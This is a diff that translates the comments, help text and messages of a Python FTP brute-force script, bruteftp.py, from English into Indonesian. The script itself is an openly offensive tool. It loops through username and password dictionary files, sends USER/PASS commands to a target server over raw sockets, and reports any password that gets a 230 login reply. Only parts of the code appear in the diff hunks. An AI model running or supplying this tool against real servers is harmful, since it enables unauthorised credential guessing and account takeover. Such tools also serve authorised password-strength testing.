@@ -1,30 +1,24 @@
-#!/usr/bin/python
-
 '''
-Simple ftp brute force attack using dictionary files for usernames and passwords
-    File name: bruteftp.py
-    Author: Dunia MR
-    Date created: 15/03/2024
-    Date created: 15/03/2024
-    Version: 1.0.0
+Serangan brute force ftp sederhana menggunakan file kamus untuk nama pengguna dan kata sandi
+    Nama file: bruteftp.py
+    Penulis: Dunia MR
+    Tanggal dibuat: 15/03/2024
+    Versi: 1.0.0.1
 '''
-
 import re
 import sys
 import socket
 import argparse
 from ipaddress import ip_address
 
-
-
 def get_args():
     parser = argparse.ArgumentParser(description='Process arguments')
     parser.add_argument("-v", "--version", help="0.1", action="store_true")
-    parser.add_argument('-d', '--debug', help='Increase verbosity to ease debugging process', action="store_true")
-    parser.add_argument('-s',"--server", type=ip_address, help='address to use', required=True)
+    parser.add_argument('-d', '--debug', help='Meningkatkan kejelasan untuk memudahkan proses debugging', action="store_true")
+    parser.add_argument('-s',"--server", type=ip_address, help='alamat untuk digunakan', required=True)
     parser.add_argument('-p','--port', nargs='?', default="21",type=int)
-    parser.add_argument('-u', '--usernames', metavar='USERNAMES_FILE', help='usernames file',required=True);
-    parser.add_argument('-pass', '--passwords', metavar='PASSWORDS_FILE', help='passwords file',required=True);
+    parser.add_argument('-u', '--usernames', metavar='FILE_NAMA_PENGGUNA', help='file nama pengguna',required=True);
+    parser.add_argument('-pass', '--passwords', metavar='FILE_KATA_SANDI', help='file kata sandi',required=True);
     args = parser.parse_args()
     version = args.version
     debug = args.debug
@@ -37,7 +31,7 @@ def get_args():
 def connect(username,password,server,port,v=False):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if debug:
-        print ("[*] Trying {} : {}".format(username,password))
+        print ("[*] Mencoba {} : {}".format(username,password))
     s.connect((str(server),port))
     data = s.recv(1024)
     s.send(('USER '+ username + '\r\n').encode())
@@ -68,5 +62,5 @@ if server and port and usernames_file and passwords_file:
                     pcnt += 1
                     attempt = connect(username, password, server, port, debug)
                     if attempt == b'230':
-                        print ("[*] Password found: {} -> ".format(password))
+                        print ("[*] Kata sandi ditemukan: {} -> ".format(password))
                         sys.exit(0)
